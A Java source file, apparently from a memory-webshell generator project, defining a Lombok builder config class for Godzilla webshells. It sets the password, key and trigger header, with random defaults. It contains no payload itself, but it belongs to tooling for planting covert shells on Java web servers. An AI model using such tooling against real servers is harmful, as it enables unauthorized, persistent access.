package com.reajason.javaweb.memshell.config;

import com.reajason.javaweb.utils.CommonUtil;
import lombok.*;
import lombok.experimental.SuperBuilder;
import org.apache.commons.lang3.StringUtils;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
@Getter
@SuperBuilder(toBuilder = true)
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class GodzillaConfig extends ShellToolConfig {
    @Builder.Default
    private String pass = CommonUtil.getRandomString(8);
    @Builder.Default
    private String key = CommonUtil.getRandomString(8);
    @Builder.Default
    private String headerName = "User-Agent";
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);

    public static abstract class GodzillaConfigBuilder<C extends GodzillaConfig, B extends GodzillaConfigBuilder<C, B>>
            extends ShellToolConfig.ShellToolConfigBuilder<C, B> {
        public B pass(final String pass) {
            if (StringUtils.isNotBlank(pass)) {
                this.pass$value = pass;
                pass$set = true;
            }
            return self();
        }

        public B key(final String key) {
            if (StringUtils.isNotBlank(key)) {
                this.key$value = key;
                key$set = true;
            }
            return self();
        }

        public B headerName(final String headerName) {
            if (StringUtils.isNotBlank(headerName)) {
                this.headerName$value = headerName;
                headerName$set = true;
            }
            return self();
        }

        public B headerValue(final String headerValue) {
            if (StringUtils.isNotBlank(headerValue)) {
                this.headerValue$value = headerValue;
                headerValue$set = true;
            }
            return self();
        }
    }
}